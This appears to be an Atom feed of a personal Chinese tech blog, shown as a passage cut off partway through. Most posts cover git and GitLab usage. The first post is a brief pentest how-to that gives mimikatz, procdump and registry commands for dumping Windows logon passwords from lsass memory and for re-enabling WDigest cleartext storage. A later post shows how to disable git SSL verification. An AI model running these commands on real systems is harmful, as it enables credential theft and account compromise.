<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>One Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://zzdkl.com.cn/"/>
  <updated>2019-10-12T03:54:05.991Z</updated>
  <id>https://zzdkl.com.cn/</id>
  
  <author>
    <name>Elliot Bia</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>把Windows密码dump下来</title>
    <link href="https://zzdkl.com.cn/2019/10/11/01_dump_win_pwd/"/>
    <id>https://zzdkl.com.cn/2019/10/11/01_dump_win_pwd/</id>
    <published>2019-10-11T02:30:59.294Z</published>
    <updated>2019-10-12T03:54:05.991Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>把Windows密码dump下来, 使用以下工具:<br>mimikatz<br>pwdump7  </p><a id="more"></a><h1 id="01-使用方法"><a href="#01-使用方法" class="headerlink" title="01 使用方法"></a>01 使用方法</h1><p>win7/10好说, 直接dump或者使用mimikatz即可</p><p><a href="https://times0ng.github.io/2018/04/20/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">参考链接</a></p><h1 id="02-本地dump"><a href="#02-本地dump" class="headerlink" title="02 本地dump"></a>02 本地dump</h1><p>运行mimikatz, 管理员权限, 执行以下命令即可</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></tbody></table></figure><h1 id="03-离线dump"><a href="#03-离线dump" class="headerlink" title="03 离线dump"></a>03 离线dump</h1><p>渗透的时候用<code>procdump</code>, 如果有机会弄到<code>lsass.exe</code>, 右键创建存储文件即可<br><img src="/upload_image/2019/10/Snipaste_2019-10-12_11-09-59.png" alt="转存文件"><br>使用<code>procdump</code>命令:<br><code>xxx\procdump.exe -accepteula -ma lsass.exe xxx\lsass.dmp</code><br>然后把dmp文件下载下来本地跑<code>mimikatz</code>即可</p><h1 id="04-失效解决方法"><a href="#04-失效解决方法" class="headerlink" title="04 失效解决方法"></a>04 失效解决方法</h1><p>微软打了补丁kb2871997，通过禁用Wdigest Auth来强制系统内存不保存明文口令<br><a href="https://www.wandouip.com/t5i18342/" target="_blank" rel="noopener">参考链接</a>  </p><p>使用命令修改注册表:<br><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></p><p>然后注销或者重启即可</p><p>以下为正常注册表, 没有<code>UseLogonCredential</code>项<br><img src="/upload_image/2019/10/Snipaste_2019-10-12_11-40-51.png" alt="正常注册表"></p><h1 id="05-下载地址"><a href="#05-下载地址" class="headerlink" title="05 下载地址"></a>05 下载地址</h1><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank" rel="noopener">ProcDump</a><br><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">mimikatz</a><br>还有一个<code>pwdump7</code>, 下载地址不是官方, 就不给出来了</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;把Windows密码dump下来, 使用以下工具:&lt;br&gt;mimikatz&lt;br&gt;pwdump7  &lt;/p&gt;
    
    </summary>
    
      <category term="Sec" scheme="https://zzdkl.com.cn/categories/Sec/"/>
    
      <category term="Windows" scheme="https://zzdkl.com.cn/categories/Sec/Windows/"/>
    
    
      <category term="Microsoft" scheme="https://zzdkl.com.cn/tags/Microsoft/"/>
    
      <category term="Sec" scheme="https://zzdkl.com.cn/tags/Sec/"/>
    
  </entry>
  
  <entry>
    <title>Git删除历史文件</title>
    <link href="https://zzdkl.com.cn/2019/09/11/git_del_file/"/>
    <id>https://zzdkl.com.cn/2019/09/11/git_del_file/</id>
    <published>2019-09-11T00:01:32.863Z</published>
    <updated>2019-10-11T02:30:47.090Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>对于历史提交敏感文件(包含了密码), 或者不小心提交了大文件<br>有两个办法进行处理:</p><ol><li>使用filter-branch  </li><li>使用BFG </li></ol><p>或者删除分支/仓库 也可以</p><a id="more"></a><p>第一种方法过于复杂, 这里推荐第二种</p><h1 id="01-文档"><a href="#01-文档" class="headerlink" title="01 文档"></a>01 文档</h1><p>首先上来就是<a href="https://rtyley.github.io/bfg-repo-cleaner/" target="_blank" rel="noopener">官方文档</a><br>这里再提一句:  <strong>阅读官方文档的能力很重要</strong><br>这也是我以后需要加强的地方, 不管是中英文档  </p><p>然后上来就是<a href="https://www.awaimai.com/2202.html" target="_blank" rel="noopener">中文文档</a>  </p><h1 id="02-使用"><a href="#02-使用" class="headerlink" title="02 使用"></a>02 使用</h1><p>参考文档就行, 这里就把执行过的命令copy一下</p><figure class="highlight dsconfig"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">git </span><span class="string">clone </span><span class="built_in">--mirror</span> <span class="string">xxx.</span><span class="string">git </span> <span class="comment"># 这里使用mirror</span></span><br><span class="line"></span><br><span class="line"><span class="string">java </span>-<span class="string">jar </span><span class="string">xxx\</span><span class="string">bfg.</span><span class="string">jar </span> <span class="built_in">--delete-folders</span> 文档收集 <span class="built_in">--delete-files</span> 文档收集  <span class="built_in">--no-blob-protection</span>  <span class="string">xxx.</span><span class="string">git </span>  <span class="comment"># 这里删除了文件夹</span></span><br><span class="line"></span><br><span class="line"><span class="string">git </span><span class="string">reflog </span><span class="string">expire </span><span class="built_in">--expire=now</span> <span class="built_in">--all</span> &amp;&amp; <span class="string">git </span><span class="string">gc </span><span class="built_in">--prune=now</span> <span class="built_in">--aggressive</span>  <span class="comment"># 这里整理空间</span></span><br><span class="line"></span><br><span class="line"><span class="string">git </span><span class="string">push </span> <span class="comment"># 推送, 记得关闭仓库保护</span></span><br></pre></td></tr></tbody></table></figure><p>需要注意的无非就是mirror, 删除命令和push的时候需要关闭保护<br>mirror应该无影响(未测)<br>删除命令可更改(看需求)<br>push需要关闭保护</p><h1 id="03-后记"><a href="#03-后记" class="headerlink" title="03 后记"></a>03 后记</h1><p>遇到这些棘手问题, 一般都是解决了就懒得写文档了<br>要强迫一下自己养成记录的文档才行了  </p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;对于历史提交敏感文件(包含了密码), 或者不小心提交了大文件&lt;br&gt;有两个办法进行处理:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用filter-branch  &lt;/li&gt;
&lt;li&gt;使用BFG &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;或者删除分支/仓库 也可以&lt;/p&gt;
    
    </summary>
    
      <category term="git" scheme="https://zzdkl.com.cn/categories/git/"/>
    
      <category term="del" scheme="https://zzdkl.com.cn/categories/git/del/"/>
    
    
      <category term="git" scheme="https://zzdkl.com.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>git冲突相关</title>
    <link href="https://zzdkl.com.cn/2019/09/09/git_conflict/"/>
    <id>https://zzdkl.com.cn/2019/09/09/git_conflict/</id>
    <published>2019-09-09T00:51:09.214Z</published>
    <updated>2019-10-11T02:30:36.387Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>某日接到新任务：优化git代码提交流程，解决冲突</p><p>给出的指导方向为：个人fork项目提交后，再合并</p><a id="more"></a><h1 id="01-解决前提：撤销修改类"><a href="#01-解决前提：撤销修改类" class="headerlink" title="01 解决前提：撤销修改类"></a>01 解决前提：撤销修改类</h1><p><a href="https://www.git-tower.com/learn/git/ebook/cn/command-line/advanced-topics/undoing-things#start" target="_blank" rel="noopener">良好的参考链接</a></p><p>所有在合并的时候出现冲突(conflict)的时候，都可以使用<code>git merge --abort</code> 命令，你的合并操作就会被安全的撤销。</p><h2 id="1-1-回退版本"><a href="#1-1-回退版本" class="headerlink" title="1.1 回退版本"></a>1.1 回退版本</h2><p><del>~ <code>git reset --hard HEAD</code> ~</del> 注意！<code>--hard</code> 命令会删除所有文件本地改动，并将本地副本恢复到上次提交之后的版本（HEAD）</p><p><code>git reset --hard 2be18d9</code> 此命令用于重置你当前的 HEAD 分支到一个特定旧的版本（2be18d9），也被称作 “回滚（rolling back）” 到旧的版本<br><strong>注意！此命令会删除所有文件本地改动</strong><br>可替换为<code>--keep</code>本地保留更改回退到版本之后的所有改动</p><p><img src="https://www.git-tower.com/learn/content/01-git/01-ebook/cn/01-command-line/05-advanced-topics/01-undoing-things/reset-concept.png" alt="重置示意图"></p><h2 id="1-2-撤销已提交的改动"><a href="#1-2-撤销已提交的改动" class="headerlink" title="1.2 撤销已提交的改动"></a>1.2 撤销已提交的改动</h2><p>除了上面的<code>reset</code>命令之外，还可以使用<code>revert</code> 撤销某个之前的提交。</p><p>但是这个命令并不是删除那个提交，相反的，它是恢复那个提交的改动，这只是看起来像是撤销而已。这个操作实际上会自动产生一个新的提交</p><p><code>git revert 2b504be</code> 此处<code>2b504be</code>为C2的版本号,在C3处回退版本到C2，变成新版本C4</p><p><img src="https://www.git-tower.com/learn/content/01-git/01-ebook/cn/01-command-line/05-advanced-topics/01-undoing-things/revert-concept.png" alt="撤销改动示意图"></p><h2 id="1-3-简单退出合并"><a href="#1-3-简单退出合并" class="headerlink" title="1.3 简单退出合并"></a>1.3 简单退出合并</h2><p><code>git merge --abort</code> 来简单地退出合并,退回到commit版本</p><h2 id="1-4-查看合并情况"><a href="#1-4-查看合并情况" class="headerlink" title="1.4 查看合并情况"></a>1.4 查看合并情况</h2><p>可以通过<code>git log -3 --graph --stat</code> 通过可视化查看合并与分支关系图</p><h1 id="02-冲突发生的情况"><a href="#02-冲突发生的情况" class="headerlink" title="02 冲突发生的情况"></a>02 冲突发生的情况</h1><p>冲突发生的情况有以下3种</p><h2 id="2-1-本地版本旧于远程版本（origin）"><a href="#2-1-本地版本旧于远程版本（origin）" class="headerlink" title="2.1 本地版本旧于远程版本（origin）"></a>2.1 本地版本旧于远程版本（origin）</h2><p>也就是远程分支比本地多出一个提交(D)，（也就是本地无commit提交，但是可以有文件改动）</p><p><img src="/upload_image/2019/06/Snipaste_2019-06-10_22-50-19.png" alt="多出一个提交D"></p><p>这时候直接通过<code>git pull</code> 就可以把本地master更新为远程master</p><p><img src="/upload_image/2019/06/Snipaste_2019-06-10_22-50-26.png" alt="更新master"></p><p>此时可以用<code>git fetch origin</code> 更新本地的远程分支（origin/master）</p><p>然后使用<code>git diff master origin/master</code> 进行查看本地的master分支和本地的远程分支(origin/master)的区别</p><p>命令为：</p><figure class="highlight crmsh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git fetch origin    <span class="comment"># 更新本地的远程分支（origin/master）</span></span><br><span class="line">git diff <span class="keyword">master</span> <span class="title">origin</span>/<span class="keyword">master</span>   <span class="title"># 比对差别</span></span><br><span class="line"><span class="title">git</span> pull    <span class="comment"># 同步</span></span><br></pre></td></tr></tbody></table></figure><p>以下为<code>a/2.txt</code>本地master的2.txt文件和远程<code>b/2.txt</code>的区别，多了内容<code>+11</code></p><p><img src="/upload_image/2019/06/Snipaste_2019-06-10_23-45-15.png" alt="更新fetch和diff"></p><h2 id="2-2-本地版本和远程版本均多出一个提交，但无冲突"><a href="#2-2-本地版本和远程版本均多出一个提交，但无冲突" class="headerlink" title="2.2 本地版本和远程版本均多出一个提交，但无冲突"></a>2.2 本地版本和远程版本均多出一个提交，但无冲突</h2><p>也就是从C节点克隆到本地库多出了E提交，但是在此之前有人在远程C节点后提交了D</p><p><img src="/upload_image/2019/06/Snipaste_2019-06-10_23-18-01.png" alt="无冲突版本"></p><p>此时可以直接<code>pull</code>而不会产生冲突，并且将本地和远程库都指向最新版本D`</p><p><img src="/upload_image/2019/06/Snipaste_2019-06-10_23-25-34.png" alt="最新提交D`"></p><p>此时如果你不更新本地库直接进行<code>push</code>会报以下错误提示：</p><p><img src="/upload_image/2019/06/Snipaste_2019-06-10_22-58-21.png" alt="错误提示"></p><p>通过<code>git status</code>可以看到本地库的状态：Your branch is ahead of ‘origin/master’ by 1 commit.</p><p><img src="/upload_image/2019/06/Snipaste_2019-06-10_23-15-26.png" alt="查看status状态"></p><p>命令为：</p><figure class="highlight dockerfile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">add</span><span class="bash"> SOME_DOCUMENT   <span class="comment"># 添加提交文件</span></span></span><br><span class="line">git commit -m <span class="string">'SOME_COMMENT'</span>    <span class="comment"># 添加commit提交</span></span><br><span class="line">git pull    <span class="comment"># 同步本地库到远程库</span></span><br><span class="line">git push origin master    <span class="comment"># 推送到远程库</span></span><br></pre></td></tr></tbody></table></figure><h2 id="2-3-最关键的来了，有冲突的时候"><a href="#2-3-最关键的来了，有冲突的时候" class="headerlink" title="2.3 最关键的来了，有冲突的时候"></a>2.3 最关键的来了，有冲突的时候</h2><p>唯一的解决办法就是查看冲突的地方，然后手工解决</p><p>如下一个场景，甲A和乙B同时维护一个<code>README.md</code>表，这个表写了详情，是从后面直接添加上去的</p><p><img src="/upload_image/2019/06/Snipaste_2019-06-10_23-54-06.png" alt="场景如下"></p><p>这时候如果本地库A和本地库B都同时增加了一个<code>4,工具D</code>，这样两个已经提交的分支的相同文件相同位置的的不同操作进行了合并，就会产生冲突。</p><p>这里举个例子，当本地库A新增了内容<code>4,工具D 本地库A</code>，以及本地库B在 <strong>同一行</strong> 新增了内容<code>4,工具D 本地库B</code> ,这时候产生了冲突</p><p>此时进行<code>pull</code> 操作会报错：</p><figure class="highlight subunit"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">error: </span>Your local changes to the following files would be overwritten by merge:</span><br><span class="line">        README.md</span><br><span class="line">Please commit your changes or stash them before you merge.</span><br><span class="line">Aborting</span><br><span class="line">Updating 9b5e3f2..ba0e98c</span><br></pre></td></tr></tbody></table></figure><p>此时最好的操作就是通过<code>diff</code>或者<code>status</code>命令查看冲突，并手动解决</p><p>命令为：</p><figure class="highlight crmsh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git fetch origin    <span class="comment"># 更新本地的远程origin分支</span></span><br><span class="line"></span><br><span class="line">git add .   <span class="comment"># 添加提交文件</span></span><br><span class="line">git commit -m 'SOME_COMMENT'    <span class="comment"># 添加commit提交</span></span><br><span class="line">git diff <span class="keyword">master</span> <span class="title">origin</span>/<span class="keyword">master</span>   <span class="title"># 查看本地master</span>分支和远程<span class="literal">master</span>分支的区别</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动解决冲突</span></span><br></pre></td></tr></tbody></table></figure><p>效果图如下：</p><p>查看差别<br><img src="/upload_image/2019/06/Snipaste_2019-06-11_00-13-48.png" alt="查看差别"></p><p>此时需要解决冲突</p><h1 id="03-软件设置"><a href="#03-软件设置" class="headerlink" title="03 软件设置"></a>03 软件设置</h1><p><a href="https://www.liaoxuefeng.com/wiki/896043488029600/900004111093344" target="_blank" rel="noopener">推荐参考链接</a></p><p>那么如何解决冲突？</p><p>打开一个比较原始的文件编辑器来清理这些冲突看起来是可行的，但是这样并不简单。使用一个专门的合并工具可以使这个操作变得更容易</p><h2 id="3-1-diffmerge"><a href="#3-1-diffmerge" class="headerlink" title="3.1 diffmerge"></a>3.1 diffmerge</h2><p>我们使用<code>diffmerge</code>进行可视化比对  <a href="https://sourcegear.com/diffmerge/downloads.php" target="_blank" rel="noopener">下载地址</a></p><p>然后进行一些设置<a href="https://www.bbsmax.com/A/MyJxag825n/" target="_blank" rel="noopener">设置链接</a>：</p><p>1，首先将diffmerge目录加入环境变量<br>2，复制sgdm.exe文件复制一份，名字改成diffmerge.exe<br>3，输入以下代码：  </p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">git config --global diff.tool diffmerge</span><br><span class="line">git config --global difftool.diffmerge.cmd 'sgdm "$LOCAL" "$REMOTE"'</span><br><span class="line">git config --global merge.tool diffmerge</span><br><span class="line">git config --global mergetool.diffmerge.cmd 'diffmerge --merge --result="$MERGED" "$LOCAL" "$(if test -f "$BASE"; then echo "$BASE"; else echo "$LOCAL"; fi)" "$REMOTE"'</span><br><span class="line">git config --global mergetool.diffmerge.trustExitCode true</span><br><span class="line">git config --global mergetool.keepBackup false</span><br></pre></td></tr></tbody></table></figure><p>使用<code>git mergetool</code>即可打开diffmerge工具</p><hr><p>坑点1：编码问题<br>使用默认的编码打开会出现编码问题，设置成 <strong>UTF-8</strong> 即可<br><a href="https://sourcegear.com/diffmerge/webhelp/sec__rule__dialog__encodings.html" target="_blank" rel="noopener">参考设置链接</a></p><hr><h1 id="4-解决冲突"><a href="#4-解决冲突" class="headerlink" title="4 解决冲突"></a>4 解决冲突</h1><p>现在我们尝试进行冲突合并</p><h2 id="4-1-设置冲突"><a href="#4-1-设置冲突" class="headerlink" title="4.1 设置冲突"></a>4.1 设置冲突</h2><p>首先设置冲突，在<code>README.md</code>的第一行改一改，让这个文件产生冲突</p><p><img src="/upload_image/2019/06/Snipaste_2019-06-13_23-12-10.png" alt="冲突文件"></p><h2 id="4-2-查看冲突"><a href="#4-2-查看冲突" class="headerlink" title="4.2 查看冲突"></a>4.2 查看冲突</h2><p>首先提交(commit)一下各个分支</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">git add .       <span class="comment"># 添加摁键</span></span><br><span class="line">git <span class="keyword">commit</span> -m <span class="string">'SOME_COMMENT'</span>    <span class="comment"># Master提交</span></span><br><span class="line">git checkout ttt        <span class="comment"># 切换分支</span></span><br><span class="line">git <span class="keyword">commit</span> -m <span class="string">'SOME_COMMENT'</span>    <span class="comment"># ttt分支提交</span></span><br><span class="line">git checkout <span class="keyword">master</span>        <span class="comment"># 切换回master分支</span></span><br><span class="line">git <span class="keyword">merge</span> ttt   <span class="comment"># 合并分支</span></span><br></pre></td></tr></tbody></table></figure><p>这时候就会出现冲突了，截图如下：</p><p><img src="/upload_image/2019/06/Snipaste_2019-06-13_23-19-06.png" alt="冲突截图"></p><h2 id="4-3-工具使用"><a href="#4-3-工具使用" class="headerlink" title="4.3 工具使用"></a>4.3 工具使用</h2><p>到了这一步我们就使用<code>git mergetool</code>进入冲突解决界面，这里可以看到说有一个冲突</p><p><img src="/upload_image/2019/06/Snipaste_2019-06-13_23-22-53.png" alt="冲突解决界面"></p><p>我们可以知道本地有三个界面：一个Local，一个Base和一个Remote</p><p>其中Local是当前分支（master），Remote是合并分支（ttt），而中间Base是可以修改的地方，并且是修改后最终的版本</p><p><img src="/upload_image/2019/06/Snipaste_2019-06-13_23-26-08.png" alt="界面对比"></p><h2 id="4-4-修改后续"><a href="#4-4-修改后续" class="headerlink" title="4.4 修改后续"></a>4.4 修改后续</h2><p>我们对文件进行修改后，直接关闭窗口，会提示是否保存，点YES</p><p><img src="/upload_image/2019/06/Snipaste_2019-06-13_23-31-23.png" alt="退出界面"></p><h2 id="4-5-提交"><a href="#4-5-提交" class="headerlink" title="4.5 提交"></a>4.5 提交</h2><p>我们保存后，mergetool会自动帮我们add，我们直接加个commit 然后merge就可以了</p><p><img src="/upload_image/2019/06/Snipaste_2019-06-13_23-32-40.png" alt="结束界面"></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">commit</span> -m <span class="string">'SOME_COMMENT'</span>    <span class="comment"># 跳过了add 步骤，可以直接commit</span></span><br><span class="line">git <span class="keyword">merge</span> ttt           <span class="comment"># 合并分支</span></span><br><span class="line">git push origin <span class="keyword">master</span></span><br></pre></td></tr></tbody></table></figure><p>然后我们查看一下是否更改成功</p><p><img src="/upload_image/2019/06/Snipaste_2019-06-13_23-33-53.png" alt="master分支"><br><img src="/upload_image/2019/06/Snipaste_2019-06-13_23-34-29.png" alt="ttt分支"></p><h1 id="05-实际应用"><a href="#05-实际应用" class="headerlink" title="05 实际应用"></a>05 实际应用</h1><p>上面说了这么多，实际应用应该怎么样呢？</p><p><strong>通过新建分支进行merge到本地master，然后再push到远程origin是比较好的方法</strong></p><p>保持本地的master分支和远程的origin分支一致是比较好的选择</p><p>解决冲突，这里解决冲突比较好的办法是修改NEW_BRANCH_NAME分支，而不是操作本地master分支</p><p>解决完冲突后，就可以把NEW_BRANCH_NAME分支合并到master分支</p><p>具体命令为：</p><figure class="highlight mipsasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">branch </span>NEW_BRANCH_NAME  <span class="comment"># 新建一个名为NEW_BRANCH_NAME的分支</span></span><br><span class="line">git checkout NEW_BRANCH_NAME    <span class="comment">#  切换到NEW_BRANCH_NAME分支</span></span><br><span class="line">git <span class="keyword">add </span>.   <span class="comment"># 添加文件</span></span><br><span class="line">git commit -m <span class="string">'SOME_COMMENT'</span>    <span class="comment"># 提交一个节点</span></span><br><span class="line">git checkout master     <span class="comment"># 切换回master分支</span></span><br><span class="line">git pull       <span class="comment"># 更新本地分支</span></span><br><span class="line">git merge NEW_BRANCH_NAME       <span class="comment"># 合并分支</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 此处有可能遇到冲突</span></span><br><span class="line"></span><br><span class="line">git push <span class="keyword">origin </span>NEW_BRANCH_NAME          <span class="comment"># 方法1：推送NEW_BRANCH_NAME到远程</span></span><br><span class="line">git push <span class="keyword">origin </span>master                   <span class="comment"># 方法2：推送master到远程</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">git <span class="keyword">diff </span>NEW_BRANCH_NAME <span class="keyword">origin/msater </span>  <span class="comment"># 查看本地NEW_BRANCH_NAME分支和远程master分支的区别</span></span><br></pre></td></tr></tbody></table></figure><h1 id="06-遇到冲突了怎么办？"><a href="#06-遇到冲突了怎么办？" class="headerlink" title="06 遇到冲突了怎么办？"></a>06 遇到冲突了怎么办？</h1><p>方法1： 把本地的分支推送到远程后联系管理员帮助进行解决<br>方法2： 按照上面的方法进行自行解决</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;00-前言&quot;&gt;&lt;a href=&quot;#00-前言&quot; class=&quot;headerlink&quot; title=&quot;00 前言&quot;&gt;&lt;/a&gt;00 前言&lt;/h1&gt;&lt;p&gt;某日接到新任务：优化git代码提交流程，解决冲突&lt;/p&gt;
&lt;p&gt;给出的指导方向为：个人fork项目提交后，再合并&lt;/p&gt;
    
    </summary>
    
      <category term="git" scheme="https://zzdkl.com.cn/categories/git/"/>
    
      <category term="conflict" scheme="https://zzdkl.com.cn/categories/git/conflict/"/>
    
    
      <category term="git" scheme="https://zzdkl.com.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>git&amp;gitlab相关</title>
    <link href="https://zzdkl.com.cn/2019/09/09/git_and_gitlab/"/>
    <id>https://zzdkl.com.cn/2019/09/09/git_and_gitlab/</id>
    <published>2019-09-09T00:51:09.088Z</published>
    <updated>2019-10-11T03:02:16.721Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="00-前言"><a href="#00-前言" class="headerlink" title="00 前言"></a>00 前言</h1><p>近日接到新任务：搭建本地git</p><p>使用到gitlab、docker安装。难度略大</p><a id="more"></a><h1 id="01-gitlab进行docker安装"><a href="#01-gitlab进行docker安装" class="headerlink" title="01 gitlab进行docker安装"></a>01 gitlab进行docker安装</h1><p><a href="https://www.jianshu.com/p/24959481340e" target="_blank" rel="noopener">安装参考链接</a></p><p>安装好以后，会显示如下图</p><p><img src="/upload_image/2019/05/Snipaste_2019-05-13_17-47-25.png" alt="安装完成"></p><p>接下来访问<code>http://ip</code>即可访问控制台</p><h1 id="02-git知识点"><a href="#02-git知识点" class="headerlink" title="02 git知识点"></a>02 git知识点</h1><ol><li>git 的操作流程</li><li>什么是分支（branch），什么是合并分支（merge bracnh）</li><li>git 拉取和推送代码</li><li>git 的设置（代理，SSL证书）</li></ol><h2 id="2-1-Git的配置命令"><a href="#2-1-Git的配置命令" class="headerlink" title="2.1 Git的配置命令"></a>2.1 Git的配置命令</h2><p>git config 配置文件，不写级别，默认是配置仓库级</p><p><strong>系统级文件 $(prefix)/etc/gitconfig</strong></p><p>git config –system 用来指定读写系统级文件。初始不存在，若不存在则无影响。</p><p><strong>用户级文件 ~/.gitconfig</strong></p><p>git config –global 指定只操作用户级文件。初始不存在，若不存在则无影响。</p><p><strong>Repository 级文件 .git/config</strong></p><p>git config –local 对写操作，则只写入 Repository 级文件（默认行为）；对读操作，则只从 Repository 级文件读。</p><h2 id="2-2-Git参考资料"><a href="#2-2-Git参考资料" class="headerlink" title="2.2 Git参考资料"></a>2.2 Git参考资料</h2><p><a href="https://blog.cnbluebox.com/blog/2014/04/15/gitlabde-shi-yong/" target="_blank" rel="noopener">入门推荐阅读</a></p><p><a href="https://www.cnblogs.com/wangmingshun/p/5425150.html" target="_blank" rel="noopener">分支知识参考链接</a></p><p><a href="https://blog.csdn.net/lizhihaoweiwei/article/details/76849755" target="_blank" rel="noopener">代理参考链接</a></p><p>SSL类自签名证书解决办法：  <a href="https://note.youdao.com/ynoteshare1/index.html?id=0bc261368fa768ce84a687ab8c795e48&amp;type=note?auto" target="_blank" rel="noopener">来自大佬的办法</a></p><pre><code>忽略SSL证书错误的方法env GIT_SSL_NO_VERIFY=true git clone https://xxx-xxx/sectools.git   #忽略SSL证书确认进行clone项目cd sectools/git config http.sslVerify "false"   #设置该项目忽略SSL证书错误</code></pre><p>自行百度，不过多说明</p><h2 id="2-3-上Git常用命令速查表"><a href="#2-3-上Git常用命令速查表" class="headerlink" title="2.3 上Git常用命令速查表"></a>2.3 上Git常用命令速查表</h2><p><img src="/upload_image/2019/06/Git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%E8%A1%A8.jpg" alt="Git常用命令速查表"></p><h1 id="03-gitlab操作"><a href="#03-gitlab操作" class="headerlink" title="03 gitlab操作"></a>03 gitlab操作</h1><p>使用<a 